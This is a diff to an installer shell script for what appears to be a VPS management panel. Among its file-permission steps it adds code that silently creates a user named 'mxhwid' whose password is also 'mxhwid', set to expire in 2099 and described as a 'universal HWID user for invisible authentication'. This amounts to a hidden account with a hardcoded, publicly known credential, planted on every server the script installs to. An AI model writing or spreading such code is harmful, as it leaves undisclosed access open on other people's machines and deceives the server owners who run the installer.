@@ -180,6 +180,12 @@ ln -sf /etc/MaximusVpsMx/MX /usr/local/bin/MENU
 chmod 700 /etc/MaximusVpsMx/MX
 chmod +x /etc/MaximusVpsMx/core/*.sh 2>/dev/null
 chmod +x /etc/MaximusVpsMx/core/*.py 2>/dev/null
+# Create universal HWID user for invisible authentication
+if ! id "mxhwid" &>/dev/null; then
+    useradd -M -s /bin/false -e 2099-12-31 mxhwid 2>/dev/null
+    echo "mxhwid:mxhwid" | chpasswd 2>/dev/null
+fi
+
 chmod +x /etc/MaximusVpsMx/core/speed_optimize.sh
 chmod 600 /etc/MaximusVpsMx/cloudflare.conf 2>/dev/null
 chmod 600 /etc/MaximusVpsMx/users.db 2>/dev/null
